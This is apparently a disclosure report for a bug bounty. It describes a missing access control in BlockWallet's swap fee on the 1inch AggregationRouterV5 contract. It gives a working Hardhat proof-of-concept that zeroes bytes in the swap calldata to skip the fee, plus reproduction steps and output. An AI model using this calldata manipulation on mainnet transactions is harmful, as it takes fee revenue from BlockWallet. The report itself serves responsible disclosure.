# Risk rating

Critical

# Title

Missing proper access control about the swap fee collected by BlockWallet.

# Links to affected code

https://etherscan.io/address/0x1111111254eeb25477b68fb85ed929f73a960582#code;

# Vulnerability details

## Bug Description

BlockWallet allows users to exchange their tokens instantly through smart contracts (e.g., [AggregationRouterV5](https://etherscan.io/address/0x1111111254eeb25477b68fb85ed929f73a960582#code)). During token exchanging, BlockWallet may collect swap fee (e.g., 0.0010661ETH in [this transaction](https://explorer.phalcon.xyz/tx/eth/0x20646935214abe32e8e4768d565345b0e2e64b5bc3996df3bca5d8a48072c22f)). However, proper access control is missing and users can easily bypass the collection of the swap fee.

More specifically, the front-end website inquires [a self-host server](https://api-blockwallet.1inch.io/v5.0/1/swap?fromAddress=0x1DA352647A577f119d1b808702B3dF21e7FFbD00&fromTokenAddress=0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&toTokenAddress=0x6810e776880c02933d47db1b9fc05908e5386b96&amount=304600000000000000&slippage=0.5&fee=0.5&referrerAddress=0x3110a855333bfb922aeCB1B3542ba2fdE28d204F&allowPartialFill=false) to obtain transaction data for a specific token exchange. However, by slightly manipulating the transaction, any users can bypass the swap fee collected by BlockWallet, hence result in financial of BlockWallet.

## Impact

Any user can bypass the swap fee collection specific by BlockWallet, which may result in 1k+ loss of BlockWallet daily.

Although this vulnerability only causes a loss of <1% for each transaction. However, considering the high volume of BlockWallet's trading transactions, we consider this a critical vulnerability.

## Proof of Concept

we impersonate [a real-world transaction](https://explorer.phalcon.xyz/tx/eth/0x20646935214abe32e8e4768d565345b0e2e64b5bc3996df3bca5d8a48072c22f), where the user exchanged 0.3046ETH for GNO. In this transaction, 0.0010661ETH was collected by [BlockWallet](https://etherscan.io/address/0xbeec796a4a2a27b687e1d48efad3805d78800522) as the swap fee. In our PoC, by manipulating the transaction parameter (i.e., setting the 61st-67nd byte of `data` as zero), we obtain more GNO with the same amount of ETH.

```
const {ethers, hre, network} = require("hardhat");
require('dotenv').config();

async function main() {
  const AggregationRouterV5Factory = await ethers.getContractFactory("AggregationRouterV5");
  const AggregationRouterV5 = AggregationRouterV5Factory.attach("0x1111111254eeb25477b68fb85ed929f73a960582");
  const GNO = await ethers.getContractAt("IERC20", "0x6810e776880c02933d47db1b9fc05908e5386b96");
  console.log("AggregationRouterV5 deployed on:", await AggregationRouterV5.getAddress());
  console.log("Current block number: ", await ethers.provider.getBlockNumber());

  const mockUserAddress = "0x1DA352647A577f119d1b808702B3dF21e7FFbD00";
  const user = await ethers.getImpersonatedSigner(mockUserAddress);
  console.log("user's address:     ", user.address);
  console.log("======Before Swap======")
  console.log("user's ETH balance: ", await ethers.provider.getBalance(user.address));
  console.log("user's GNO balance: ", await GNO.balanceOf(user.address));

  let executor = "0x92f3f71cef740ed5784874b8c70ff87ecdf33588";
  let desc = {
    srcToken: "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
    dstToken: "0x6810e776880c02933d47db1b9fc05908e5386b96",
    srcReceiver: "0x92f3f71cef740ed5784874b8c70ff87ecdf33588",
    dstReceiver: mockUserAddress,
    amount: "304600000000000000",
    minReturnAmount: "4955163944170767155",
    flags: 0,
  };
  let permit = "0x";
  //setting the 61st-67nd byte as zero
  // let data = "0x0000000000000000000000000000000000000000a900004600002c000026e021beec796a4a2a27b687e1d48efad3805d7880052200000000000000000003c99cbfcb880000206b4be0b94041c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2d0e30db002a000000000000000000000000000000000000000000000000044c4475a881f4333ee63c1e580f56d08221b5942c428acc5de8f78489a97fc5599c02aaa39b223fe8d0a0e5c4f27ead9083c756cc21111111254eeb25477b68fb85ed929f73a960582";
  let data = "0x0000000000000000000000000000000000000000a900004600002c000026e021beec796a4a2a27b687e1d48efad3805d788005220000000000000000000000000000000000206b4be0b94041c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2d0e30db002a000000000000000000000000000000000000000000000000044c4475a881f4333ee63c1e580f56d08221b5942c428acc5de8f78489a97fc5599c02aaa39b223fe8d0a0e5c4f27ead9083c756cc21111111254eeb25477b68fb85ed929f73a960582";

  await AggregationRouterV5.connect(user).swap(executor, desc, permit, data, {value: "304600000000000000"});

  console.log("=======After Swap======")
  console.log("user's ETH balance: ", await ethers.provider.getBalance(user.address));
  console.log("user's GNO balance: ", await GNO.balanceOf(user.address));
  //user's GNO balance: 7068116105222997127
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

### Steps to Reproduce

```
npm install
npx hardhat run scripts/test.js
```

### Expected Result

Compared to [the transaction](https://explorer.phalcon.xyz/tx/eth/0x20646935214abe32e8e4768d565345b0e2e64b5bc3996df3bca5d8a48072c22f), we get around 0.0176 (7.0856-7.0681) more GNO with the same amount of ETH.

```
AggregationRouterV5 deployed on: 0x1111111254eeb25477b68fb85ed929f73a960582
Current block number:  17890044
user's address:      0x1DA352647A577f119d1b808702B3dF21e7FFbD00
======Before Swap======
user's ETH balance:  12038707039792156691n
user's GNO balance:  2062900000000000000n
=======After Swap======
user's ETH balance:  11731691213882114251n
user's GNO balance:  7085695549800451499n
```

## Risk Breakdown

Attack vector: Network
Attack complexity: Low
Privileges required: None
User interaction: None
Scope: Unchanged
Confidentiality: None
Integrity: High
Availability: None

CVSS V3 Score: 7.5